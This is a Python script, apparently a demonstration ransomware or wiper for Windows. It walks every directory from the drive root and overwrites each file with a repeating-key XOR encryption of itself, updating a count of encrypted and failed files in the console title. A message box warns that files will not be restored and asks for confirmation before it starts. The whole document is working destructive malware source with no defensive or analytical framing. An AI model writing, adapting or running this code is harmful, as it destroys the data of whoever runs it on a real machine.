import os
import sys
import ctypes

key = bytearray("¹²³£¢¬ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%¨&*()`^{}<>:?,.;/\\".encode())

files_count = 0
success = 0
err_count = 0

def title(string):
    ctypes.windll.kernel32.SetConsoleTitleW(string)

def encrypt_file(file_name):
    global success

    with open(file_name, 'rb') as f:
        plain_text = f.read()

    encrypted_text = bytearray(len(plain_text))

    for i, b in enumerate(plain_text):
        encrypted_text[i] = b ^ key[i % len(key)]

    if os.path.exists(os.path.abspath(file_name)):
        os.remove(os.path.abspath(file_name))

    with open(file_name, 'wb') as f:
        f.write(encrypted_text)
    
    success += 1

def init():
    global files_count
    global err_count
    global success

    for (root, dirs, files) in os.walk("\\"):
        #print(f"[ENCRYPTING] Working on {root}")

        for file in files:
            files_count += 1
            try:
                encrypt_file(os.path.join(root, file))
            except FileNotFoundError as e:
                #print(f'[ERROR] File "{os.path.abspath(os.path.join(root, file))}" doesn\'t exist')
                err_count += 1
                pass
            except Exception as e:
                #print(f'[ERROR] {e}')
                err_count += 1
                pass

            title(f'Encrypted: {success}/{files_count} [Failed: {err_count}]')

def checkopt(titleMsg: str, message: str) -> bool:
    response = ctypes.windll.user32.MessageBoxW(None, message, titleMsg, 0x40 | 0x1)
    return response == 1
    

if (checkopt("FATAL, BE CAREFULL!", "This script tries to encrypt all files of the computer\nThe files won't be restored nor readable anymore\nDon't run this script out of a Virtual Enviroment!\nCheck if you wan't to continue")):
    init()
else:
    ctypes.windll.user32.MessageBoxW(None, "You choose to cancel the script!", "Aborting", 0x40 | 0x0)
    sys.exit()
    
print(f'End of script with encrypted: {success}/{files_count} [Failed: {err_count}]')

try:
    print("\n\nPress Control+C to end the program\n\n")
    while True:
        pass
except KeyboardInterrupt:
    sys.exit()